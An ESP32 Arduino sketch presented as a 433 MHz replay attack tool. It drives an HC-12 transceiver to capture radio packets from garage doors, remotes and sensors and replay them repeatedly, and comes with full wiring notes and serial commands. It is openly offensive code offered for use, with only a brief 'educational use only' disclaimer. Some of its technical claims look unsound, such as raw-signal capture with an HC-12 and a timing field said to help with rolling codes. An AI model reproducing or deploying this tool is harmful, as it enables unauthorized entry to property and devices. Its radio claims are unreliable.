/*
 * H5 — 433 MHz Replay Attack Tool
 * Capture and replay 433 MHz signals (garage doors, remotes, sensors)
 * 
 * Hardware: ESP32 NodeMCU + HC-12 433 MHz transceiver
 * 
 * HC-12 Wiring:
 *   TXD → RX2 (GPIO16)
 *   RXD → TX2 (GPIO17)
 *   VCC → 5V rail
 *   GND → GND rail
 *   SET → GND (AT mode) or floating (normal mode)
 * 
 * WARNING: Educational use only. Test on your own devices.
 * 
 * Author: 5h4d0wn1k
 * License: MIT
 * Date: 2026-08-26
 */

#include <HardwareSerial.h>

// HC-12 Configuration
#define HC12_TX  17  // TX2 → HC-12 RXD
#define HC12_RX  16  // RX2 → HC-12 TXD
#define HC12_SET 4   // SET pin (optional, for AT commands)

// Serial ports
#define HC12_SERIAL Serial2
#define DEBUG_SERIAL Serial

// Data storage
#define MAX_PACKETS 20
#define MAX_PACKET_SIZE 64

// Packet structure
struct Packet {
    uint8_t data[MAX_PACKET_SIZE];
    uint8_t length;
    uint32_t timestamp;
    uint32_t frequency;  // Not really frequency, but timing pattern
    bool captured;
};

// Global state
Packet packets[MAX_PACKETS];
int packet_count = 0;
int selected_packet = -1;
bool capture_mode = false;
bool replay_mode = false;
uint32_t last_capture_time = 0;

// AT command mode
bool at_mode = false;

// Function prototypes
void enterATMode();
void exitATMode();
void sendATCommand(const char* cmd);
void capturePacket();
void replayPacket(int index);
void replayPacketLoop(int index, int count);
void listPackets();
void selectPacket(int index);
void showHelp();
void processSerialCommand();

void setup() {
    DEBUG_SERIAL.begin(115200);
    DEBUG_SERIAL.println("\n=== H5 — 433 MHz Replay Tool ===");
    DEBUG_SERIAL.println("WARNING: Educational use only!");
    DEBUG_SERIAL.println();
    
    // Initialize HC-12 serial
    HC12_SERIAL.begin(9600, SERIAL_8N1, HC12_RX, HC12_TX);
    
    // Initialize SET pin
    pinMode(HC12_SET, OUTPUT);
    digitalWrite(HC12_SET, HIGH);  // Normal mode
    
    delay(100);
    
    // Test HC-12
    DEBUG_SERIAL.println("Testing HC-12...");
    HC12_SERIAL.println("AT");
    delay(100);
    
    if (HC12_SERIAL.available()) {
        String response = HC12_SERIAL.readString();
        if (response.indexOf("OK") >= 0) {
            DEBUG_SERIAL.println("HC-12 responding (AT mode active)");
            exitATMode();
        } else {
            DEBUG_SERIAL.println("HC-12 in normal mode");
        }
    } else {
        DEBUG_SERIAL.println("HC-12 no response (normal mode expected)");
    }
    
    DEBUG_SERIAL.println("\nHC-12 ready on 9600 baud");
    DEBUG_SERIAL.println();
    showHelp();
}

void loop() {
    // Capture incoming data
    if (capture_mode && HC12_SERIAL.available()) {
        capturePacket();
    }
    
    // Handle serial commands
    if (DEBUG_SERIAL.available()) {
        processSerialCommand();
    }
}

void processSerialCommand() {
    String cmd = DEBUG_SERIAL.readStringUntil('\n');
    cmd.trim();
    
    if (cmd == "help") {
        showHelp();
    } else if (cmd == "capture") {
        capture_mode = true;
        DEBUG_SERIAL.println("Capture mode ON. Listening for 433 MHz signals...");
    } else if (cmd == "stop") {
        capture_mode = false;
        replay_mode = false;
        DEBUG_SERIAL.println("Capture/Replay stopped.");
    } else if (cmd == "list") {
        listPackets();
    } else if (cmd.startsWith("select ")) {
        int idx = cmd.substring(7).toInt();
        selectPacket(idx);
    } else if (cmd == "replay") {
        if (selected_packet >= 0) {
            replayPacket(selected_packet);
        } else {
            DEBUG_SERIAL.println("No packet selected! Use 'select N'");
        }
    } else if (cmd.startsWith("replay ")) {
        // replay N or loop N count
        int space1 = cmd.indexOf(' ');
        int space2 = cmd.indexOf(' ', space1 + 1);
        
        if (space2 > 0) {
            int idx = cmd.substring(space1 + 1, space2).toInt();
            int count = cmd.substring(space2 + 1).toInt();
            replayPacketLoop(idx, count);
        } else {
            int idx = cmd.substring(space1 + 1).toInt();
            replayPacket(idx);
        }
    } else if (cmd == "at") {
        enterATMode();
    } else if (cmd == "exit") {
        exitATMode();
    } else if (cmd.startsWith("AT")) {
        sendATCommand(cmd.c_str());
    } else if (cmd == "clear") {
        packet_count = 0;
        selected_packet = -1;
        DEBUG_SERIAL.println("Cleared all captured packets.");
    } else {
        DEBUG_SERIAL.println("Unknown command. Type 'help' for commands.");
    }
}

void showHelp() {
    DEBUG_SERIAL.println("\n=== Commands ===");
    DEBUG_SERIAL.println("capture     - Start capturing 433 MHz signals");
    DEBUG_SERIAL.println("stop        - Stop capture/replay");
    DEBUG_SERIAL.println("list        - List captured packets");
    DEBUG_SERIAL.println("select N    - Select packet N");
    DEBUG_SERIAL.println("replay      - Replay selected packet once");
    DEBUG_SERIAL.println("replay N    - Replay packet N once");
    DEBUG_SERIAL.println("replay N M  - Replay packet N M times");
    DEBUG_SERIAL.println("at          - Enter AT command mode");
    DEBUG_SERIAL.println("exit        - Exit AT command mode");
    DEBUG_SERIAL.println("AT+XX       - Send AT command to HC-12");
    DEBUG_SERIAL.println("clear       - Clear captured packets");
    DEBUG_SERIAL.println("help        - Show this help");
    DEBUG_SERIAL.println("================\n");
}

void capturePacket() {
    if (packet_count >= MAX_PACKETS) {
        DEBUG_SERIAL.println("Packet buffer full! Use 'clear' to reset.");
        return;
    }
    
    // Read available data
    uint8_t buffer[MAX_PACKET_SIZE];
    int len = 0;
    
    while (HC12_SERIAL.available() && len < MAX_PACKET_SIZE) {
        buffer[len++] = HC12_SERIAL.read();
        delayMicroseconds(100);  // Wait for more data
    }
    
    if (len > 0) {
        // Store packet
        memcpy(packets[packet_count].data, buffer, len);
        packets[packet_count].length = len;
        packets[packet_count].timestamp = millis();
        packets[packet_count].captured = true;
        
        // Calculate timing pattern (for rolling codes)
        uint32_t now = millis();
        if (packet_count > 0) {
            packets[packet_count].frequency = now - last_capture_time;
        } else {
            packets[packet_count].frequency = 0;
        }
        last_capture_time = now;
        
        // Log packet
        DEBUG_SERIAL.printf("\n[CAPTURE] Packet #%d (%d bytes):\n", packet_count, len);
        DEBUG_SERIAL.print("  HEX: ");
        for (int i = 0; i < len; i++) {
            DEBUG_SERIAL.printf("%02X ", buffer[i]);
        }
        DEBUG_SERIAL.println();
        
        DEBUG_SERIAL.print("  BIN: ");
        for (int i = 0; i < len; i++) {
            for (int b = 7; b >= 0; b--) {
                DEBUG_SERIAL.print((buffer[i] >> b) & 1);
            }
            DEBUG_SERIAL.print(" ");
        }
        DEBUG_SERIAL.println();
        
        if (packet_count > 0 && packets[packet_count].frequency > 0) {
            DEBUG_SERIAL.printf("  Timing: %lu ms since last packet\n", 
                               packets[packet_count].frequency);
        }
        
        packet_count++;
        DEBUG_SERIAL.printf("  Total captured: %d\n", packet_count);
    }
}

void replayPacket(int index) {
    if (index < 0 || index >= packet_count) {
        DEBUG_SERIAL.println("Invalid packet index!");
        return;
    }
    
    DEBUG_SERIAL.printf("\n[REPLAY] Sending packet #%d (%d bytes)...\n", 
                       index, packets[index].length);
    
    // Send packet
    HC12_SERIAL.write(packets[index].data, packets[index].length);
    
    DEBUG_SERIAL.print("  HEX: ");
    for (int i = 0; i < packets[index].length; i++) {
        DEBUG_SERIAL.printf("%02X ", packets[index].data[i]);
    }
    DEBUG_SERIAL.println();
    
    DEBUG_SERIAL.println("  Sent!");
}

void replayPacketLoop(int index, int count) {
    if (index < 0 || index >= packet_count) {
        DEBUG_SERIAL.println("Invalid packet index!");
        return;
    }
    
    if (count <= 0) count = 1;
    if (count > 100) count = 100;
    
    DEBUG_SERIAL.printf("\n[REPLAY LOOP] Sending packet #%d × %d times...\n", 
                       index, count);
    
    for (int i = 0; i < count; i++) {
        HC12_SERIAL.write(packets[index].data, packets[index].length);
        DEBUG_SERIAL.printf("  Send %d/%d\n", i + 1, count);
        delay(100);  // Delay between replays
    }
    
    DEBUG_SERIAL.println("  Done!");
}

void listPackets() {
    if (packet_count == 0) {
        DEBUG_SERIAL.println("No packets captured yet.");
        return;
    }
    
    DEBUG_SERIAL.println("\n=== Captured Packets ===");
    for (int i = 0; i < packet_count; i++) {
        DEBUG_SERIAL.printf("[%2d] %3d bytes | %8lu ms | ", 
                           i, packets[i].length, packets[i].timestamp);
        
        // Show first 8 bytes as hex
        for (int j = 0; j < min((int)packets[i].length, 8); j++) {
            DEBUG_SERIAL.printf("%02X ", packets[i].data[j]);
        }
        if (packets[i].length > 8) DEBUG_SERIAL.print("...");
        
        if (i == selected_packet) DEBUG_SERIAL.print(" <<SELECTED>>");
        DEBUG_SERIAL.println();
    }
    DEBUG_SERIAL.println("========================\n");
}

void selectPacket(int index) {
    if (index < 0 || index >= packet_count) {
        DEBUG_SERIAL.println("Invalid packet index!");
        return;
    }
    
    selected_packet = index;
    DEBUG_SERIAL.printf("Selected packet #%d\n", index);
    DEBUG_SERIAL.print("  HEX: ");
    for (int i = 0; i < packets[index].length; i++) {
        DEBUG_SERIAL.printf("%02X ", packets[index].data[i]);
    }
    DEBUG_SERIAL.println();
}

void enterATMode() {
    DEBUG_SERIAL.println("Entering AT mode...");
    digitalWrite(HC12_SET, LOW);
    delay(100);
    
    HC12_SERIAL.println("AT");
    delay(100);
    
    if (HC12_SERIAL.available()) {
        String response = HC12_SERIAL.readString();
        DEBUG_SERIAL.println("HC-12: " + response);
    }
    
    at_mode = true;
    DEBUG_SERIAL.println("AT mode active. Send AT commands directly.");
}

void exitATMode() {
    DEBUG_SERIAL.println("Exiting AT mode...");
    digitalWrite(HC12_SET, HIGH);
    delay(100);
    
    at_mode = false;
    DEBUG_SERIAL.println("Normal mode restored.");
}

void sendATCommand(const char* cmd) {
    HC12_SERIAL.println(cmd);
    delay(100);
    
    if (HC12_SERIAL.available()) {
        String response = HC12_SERIAL.readString();
        DEBUG_SERIAL.println("HC-12: " + response);
    } else {
        DEBUG_SERIAL.println("No response from HC-12.");
    }
}
